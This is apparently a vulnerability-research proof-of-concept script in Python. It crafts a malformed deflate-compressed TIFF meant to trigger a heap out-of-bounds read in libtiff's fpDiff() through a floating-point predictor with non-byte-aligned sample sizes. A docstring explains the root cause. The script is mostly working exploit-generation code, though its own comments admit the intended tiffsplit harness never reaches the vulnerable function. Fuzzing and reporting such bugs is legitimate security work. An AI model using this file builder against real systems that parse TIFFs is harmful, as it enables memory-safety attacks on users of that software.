#!/usr/bin/env python3
"""
PoC Generator for VULN 002: Heap Buffer OOB Read in fpDiff() via
Non-Multiple-of-8 BitsPerSample with Floating-Point Predictor.

Vulnerability in: libtiff/libtiff/tif_predict.c, fpDiff(), lines 517-548
Trigger conditions:
  - Predictor=3 (FLOATING_POINT)
  - SampleFormat=6 (IEEEFP)
  - BitsPerSample=9 (non-multiple of 8, so bps=9/8=1 via integer division)
  - SamplesPerPixel=5 (stride=5 for CONTIG)
  - Width=3 -> rowsize=17, stride=5, 17%5=2 != 0

Root cause in fpDiff:
  stride = 5, cc = 17
  cp += cc - stride - 1  ->  cp = cp0 + 11
  Loop: for count = 17; count > 5; count -= 5
    REPEAT4(5, cp[stride] -= cp[0]; cp--)
  When count=7 (iteration 3), REPEAT4 runs 5 times:
    After 2 iters: cp = cp0+0
    Iter 3: cp[5] -= cp[0] -- valid (reads [5] and [0])
    After decrement: cp = cp0-1
    Iter 4: cp[5] -= cp[0] -- reads cp0+4 and cp0-1 (OOB!)
    Iter 5: cp[5] -= cp[0] -- reads cp0+3 and cp0-2 (OOB!)

NOTE: tiffsplit uses TIFFReadRawStrip / TIFFWriteRawStrip which BYPASS the
predictor encoding path. fpDiff is only called via TIFFWriteEncodedStrip ->
PredictorEncodeRow -> fpDiff. Since tiffsplit never calls TIFFWriteEncodedStrip,
fpDiff is not triggered. This PoC still crafts the correct malicious TIFF.
"""
import struct
import zlib
import os
import sys

OUT_DIR = "/data/ylwang/non-textfuzz/target/_poc/libtiff/libtiff_tif_predict_c"
OUT_FILE = os.path.join(OUT_DIR, "vuln_002.tif")

# TIFF type codes
SHORT = 3  # uint16
LONG  = 4  # uint32

# TIFF tag constants
TIFFTAG_IMAGEWIDTH       = 0x0100  # 256
TIFFTAG_IMAGELENGTH      = 0x0101  # 257
TIFFTAG_BITSPERSAMPLE    = 0x0102  # 258
TIFFTAG_COMPRESSION      = 0x0103  # 259
TIFFTAG_PHOTOMETRIC      = 0x0106  # 262
TIFFTAG_STRIPOFFSETS     = 0x0111  # 273
TIFFTAG_SAMPLESPERPIXEL  = 0x0115  # 277
TIFFTAG_ROWSPERSTRIP     = 0x0116  # 278
TIFFTAG_STRIPBYTECOUNTS  = 0x0117  # 279
TIFFTAG_PLANARCONFIG     = 0x011C  # 284
TIFFTAG_PREDICTOR        = 0x013D  # 317
TIFFTAG_SAMPLEFORMAT     = 0x0153  # 339

# Image parameters that trigger the OOB in fpDiff
WIDTH            = 3   # pixels
HEIGHT           = 1   # rows
BITS_PER_SAMPLE  = 9   # KEY: non-multiple of 8; bps = 9//8 = 1 in fpDiff
SAMPLES_PER_PIXEL = 5  # stride = 5 (CONTIG mode)
COMPRESSION      = 8   # Deflate/ZIP
PHOTOMETRIC      = 1   # MinIsBlack
ROWS_PER_STRIP   = 1
PLANAR_CONFIG    = 1   # CONTIG
PREDICTOR        = 3   # FLOATING_POINT
SAMPLE_FORMAT    = 6   # IEEEFP

# Compute row size: ((width * samplesperpixel * bitspersample) + 7) / 8
row_size = (WIDTH * SAMPLES_PER_PIXEL * BITS_PER_SAMPLE + 7) // 8
print(f"[*] row_size = {row_size} bytes")
print(f"[*] stride   = {SAMPLES_PER_PIXEL}")
print(f"[*] row_size % stride = {row_size % SAMPLES_PER_PIXEL} (must be != 0 to trigger OOB)")
assert row_size % SAMPLES_PER_PIXEL != 0, "No OOB would occur with this config"

# Strip payload: row_size zero bytes, deflate-compressed
raw_strip = bytes(row_size)
compressed_strip = zlib.compress(raw_strip, 9)
strip_size = len(compressed_strip)
print(f"[*] compressed strip size = {strip_size} bytes")

def ifd_entry(tag, type_, count, value):
    """Pack a 12-byte TIFF IFD entry. For SHORT/LONG single values."""
    return struct.pack('<HHII', tag, type_, count, value)

# Header is 8 bytes; IFD starts at offset 8
num_entries = 12
ifd_header_size = 2                  # entry count
ifd_entries_size = num_entries * 12  # 12 bytes per entry
ifd_footer_size = 4                  # next IFD pointer
ifd_total = ifd_header_size + ifd_entries_size + ifd_footer_size  # = 150 bytes

strip_offset = 8 + ifd_total  # strip data immediately follows IFD

# Build IFD entries in ascending tag order (required by TIFF spec)
entries = [
    ifd_entry(TIFFTAG_IMAGEWIDTH,      SHORT, 1, WIDTH),
    ifd_entry(TIFFTAG_IMAGELENGTH,     SHORT, 1, HEIGHT),
    ifd_entry(TIFFTAG_BITSPERSAMPLE,   SHORT, 1, BITS_PER_SAMPLE),
    ifd_entry(TIFFTAG_COMPRESSION,     SHORT, 1, COMPRESSION),
    ifd_entry(TIFFTAG_PHOTOMETRIC,     SHORT, 1, PHOTOMETRIC),
    ifd_entry(TIFFTAG_STRIPOFFSETS,    LONG,  1, strip_offset),
    ifd_entry(TIFFTAG_SAMPLESPERPIXEL, SHORT, 1, SAMPLES_PER_PIXEL),
    ifd_entry(TIFFTAG_ROWSPERSTRIP,    LONG,  1, ROWS_PER_STRIP),
    ifd_entry(TIFFTAG_STRIPBYTECOUNTS, LONG,  1, strip_size),
    ifd_entry(TIFFTAG_PLANARCONFIG,    SHORT, 1, PLANAR_CONFIG),
    ifd_entry(TIFFTAG_PREDICTOR,       SHORT, 1, PREDICTOR),
    ifd_entry(TIFFTAG_SAMPLEFORMAT,    SHORT, 1, SAMPLE_FORMAT),
]
assert len(entries) == num_entries

# Assemble: TIFF little-endian header (0x4949, 42, IFD@8)
header = struct.pack('<HHI', 0x4949, 42, 8)

# IFD block
ifd = struct.pack('<H', num_entries)
for e in entries:
    ifd += e
ifd += struct.pack('<I', 0)  # next IFD = 0 (single-directory)

tiff_data = header + ifd + compressed_strip
assert len(tiff_data) == 8 + ifd_total + strip_size

os.makedirs(OUT_DIR, exist_ok=True)
with open(OUT_FILE, 'wb') as f:
    f.write(tiff_data)

print(f"[+] Written {len(tiff_data)} bytes to {OUT_FILE}")
print(f"[*] Strip data offset in file: 0x{strip_offset:x} ({strip_offset})")
print()
print("[!] IMPORTANT: tiffsplit uses TIFFReadRawStrip + TIFFWriteRawStrip")
print("[!] These bypass the predictor encoding path (fpDiff is never called).")
print("[!] fpDiff is only reachable via TIFFWriteEncodedStrip -> PredictorEncodeRow.")
print("[!] Expected result: tiffsplit will process the file WITHOUT triggering the OOB.")
